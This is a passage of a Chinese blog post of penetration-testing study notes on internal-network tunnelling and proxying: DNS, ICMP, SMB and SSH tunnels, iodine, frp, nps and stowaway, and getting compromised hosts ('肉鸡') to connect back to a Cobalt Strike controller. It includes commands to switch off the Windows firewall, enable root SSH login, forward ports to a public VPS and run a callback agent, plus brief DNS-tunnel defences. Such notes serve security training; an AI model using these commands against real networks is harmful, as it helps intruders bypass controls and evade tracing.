<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Windows 防火墙命令：</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/tomtellyou/p/16300557.html</span><br><span class="line"></span><br><span class="line">查看当前防火墙状态：netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">关闭防火墙：netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">开启防火墙：netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">恢复初始防火墙设置：netsh advfirewall reset</span><br><span class="line"></span><br><span class="line">启用桌面防火墙: netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy,allowinbound,allowoutbound</span><br><span class="line"></span><br><span class="line">如果设置为拒绝使用 blockinbound,blockoutbound</span><br></pre></td></tr></table></figure>

<h1 id="第126天：内网安全-隧道技术-SSH-DNS-ICMP-SMB-上线通讯Linux-Mac"><a href="#第126天：内网安全-隧道技术-SSH-DNS-ICMP-SMB-上线通讯Linux-Mac" class="headerlink" title="第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac"></a>第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac</h1><h4 id="知识点：-60"><a href="#知识点：-60" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、入站规则不出网上线方案</p>
<p>2、出站规则不出网上线方案</p>
<p>3、隧道技术-SMB&amp;ICMP&amp;DNS&amp;SSH</p>
<p>4、控制上线-Linux&amp;Mac&amp;IOS&amp;Android</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<p>-内网穿透：解决网络控制上线&amp;网络通讯问题</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<h4 id="系列点：-3"><a href="#系列点：-3" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/63f4b1a104567b33b43cd8c1f8be375b--3e6f--image-20240511091624701.png" alt="image-20240511091624701"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/19753b8cfc1445cd20e5cd78f4224ff4--c9fc--image-20240511091655868.png" alt="image-20240511091655868"></p>
<h4 id="演示案例：-55"><a href="#演示案例：-55" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 隧道技术-SMB 协议-判断&amp;通讯&amp;上线</p>
<p> 隧道技术-ICMP 协议-判断&amp;通讯&amp;上线</p>
<p> 隧道技术-DNS 协议-判断&amp;通讯&amp;上线</p>
<p> 隧道技术-SSH 协议-判断&amp;通讯&amp;上线</p>
<p> 控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android</p>
<p>1、判断出网协议</p>
<p>2、使用出网协议建立隧道</p>
<p>#SMB 隧道&amp;通讯&amp;上线</p>
<p>判断：445 通讯</p>
<p>上线：借助通讯后绑定上线</p>
<p>通讯：直接 SMB 协议通讯即可</p>
<p>#ICMP 隧道&amp;通讯&amp;上线</p>
<p>判断：ping 命令</p>
<p>上线：见前面课程</p>
<p>通讯：其他项目(icmpsh icmptunnel)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>#DNS 隧道&amp;通讯&amp;上线</p>
<p>判断：nslookup dig</p>
<p>1、上线环境：内网主机只出网 DNS 协议数据，解决上线</p>
<p>-域名申请及配置</p>
<p>-监听器创建及配置</p>
<p>-后门绑定监听器及生成</p>
<p>2、通讯环境：</p>
<p>内网主机只出网 DNS 协议数据，解决通讯</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
<p>判断出网：nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
<p>-服务器：设置密码 xiaodi 并创建虚拟 IP 及绑定域名指向</p>
<p>iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD</p>
<p>设置密码 xiaodi 并创建虚拟 IP 及绑定域名指向</p>
<p>-客户端：连接密码 xiaodi 并绑定域名指向</p>
<p>iodine -f -M 200 -P xiaodi ns1.xiaodi8.com</p>
<p>-尝试通讯尝试连接：</p>
<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;</a></p>
<p>#SSH 隧道&amp;通讯</p>
<p>判断：ssh 连接</p>
<p>1、上线：</p>
<p>由于 CS 无 SSH 协议监听器配置，无法上线</p>
<p>2、通讯：</p>
<p>由于SSH协议存在于Linux系统，跳板机必须Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iptables -F /* 清除所有规则 /</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT /允许包从22端口进入/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /允许从22端口进入的包返回/</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT / 域名解析端口，一般不开 /</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT / 域名解析端口，一般不开 /</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT /允许本机访问本机/</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT /允许所有IP访问80端口/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables /保存配置/</span><br><span class="line">iptables -L / 显示iptables列表 */</span><br></pre></td></tr></table></figure>

<p>开启ssh协议登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>

<p>本地：入站封<br>将本地访问 10.10.10.132的流量转发至公网vps 1234端口上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 1122:10.10.10.132:8080 root@47.94.130.xx</span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure>

<p>远程：出站封<br>将本地访问10.10.10.132的流量转发至本地的1234的端口上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 1234:10.10.10.132:8080 root@10.10.10.146</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<p>防御DNS隧道攻击的方法<br>禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。<br>虽然没有人会将TXT解析请求发送给DNS服务器，但是邮件服务器&#x2F;网关会这样做，因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。<br>跟踪用户的DNS查询次数，如果达到阈值，就生成相应的报告</p>
<p>控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android<br>项目：<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>面向Linux Mac IOS Android系统上线支持<br>1、插件使用<br>2、命令使用<br>使用参考：<br><a target="_blank" rel="noopener" href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>1、下载对应版本加载器和CNA插件<br>2、上传加载器文件和本地加载CNA插件<br>3、修改CNA插件配置路径及上传Key文件<br>4、使用命令或插件绑定HTTPS监听器生成</p>
<p>使用CS4.7版本没有搭建成功</p>
<h1 id="第127天：内网安全-隧道搭建-穿透上线-FRP-NPS-SPP-Ngrok-EW项目"><a href="#第127天：内网安全-隧道搭建-穿透上线-FRP-NPS-SPP-Ngrok-EW项目" class="headerlink" title="第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目"></a>第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目</h1><h4 id="知识点：-61"><a href="#知识点：-61" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、内网隧道&amp;穿透&amp;加密&amp;上线</p>
<p>2、项目-Ngrok&amp;Frp&amp;Nps&amp;Spp</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<p>-内网穿透：解决网络控制上线&amp;网络通讯问题</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<h4 id="系列点：-4"><a href="#系列点：-4" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/3d6e827033023f8a4d370bc1daaf216a--0495--image-20240511092308716.png" alt="image-20240511092308716"></p>
<h4 id="演示案例：-56"><a href="#演示案例：-56" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 内网穿透-Ngrok-入门-上线</p>
<p> 内网穿透-Frp-简易型-上线</p>
<p> 内网穿透-Nps-自定义-上线</p>
<p> 内网穿透-Spp-特殊协议-上线</p>
<p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构</p>
<p>Linux：Proxychains</p>
<p>Windows：Sockscap Proxifier</p>
<p>穿透项目：Ngrok Frp Spp Nps EW(停更)</p>
<p>优点：穿透加密数据，中间平台，防追踪，解决网络问题</p>
<p><a target="_blank" rel="noopener" href="https://www.ngrok.cc/">https://www.ngrok.cc</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p><a target="_blank" rel="noopener" href="http://www.rootkiter.com/EarthWorm">http://www.rootkiter.com/EarthWorm</a></p>
<p>内网穿透的隧道搭建有很多，这里就主要讲讲我使用的工具stowaway</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a>   参考链接</p>
<p>1、控制端配置</p>
<p>上传控制端到kali，使用被动模式，监听端口8000，并对通信进行加密秘钥为123。等待被控端的连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 192.168.125.134:8000 -s 123</span><br></pre></td></tr></table></figure>

<p> #或者不指定ip默认监听0.0.0.0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure>

<p>2、被控端配置</p>
<p>在win2012-1上执行，使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>

<p>然后就是在admin端去创建socks即可</p>
<h1 id="第128天：内网安全-横向移动-IPC-AT-SC命令-Impacket套件-CS插件-全自动"><a href="#第128天：内网安全-横向移动-IPC-AT-SC命令-Impacket套件-CS插件-全自动" class="headerlink" title="第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动"></a>第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动</h1>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/" rel="prev" title="java学习历程记录-JavaWeb">
                  <i class="fa fa-angle-left"></i> java学习历程记录-JavaWeb
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/03/06/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="ctfshow刷题记录">
                  ctfshow刷题记录 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">6pc1</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">178k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:42</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-pi-one.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"请文明评论呀","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"}</script>
<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script>


  <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
  <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
  <script type="text/javascript" src="/js/fireworks.js"></script>
</body>
</html>
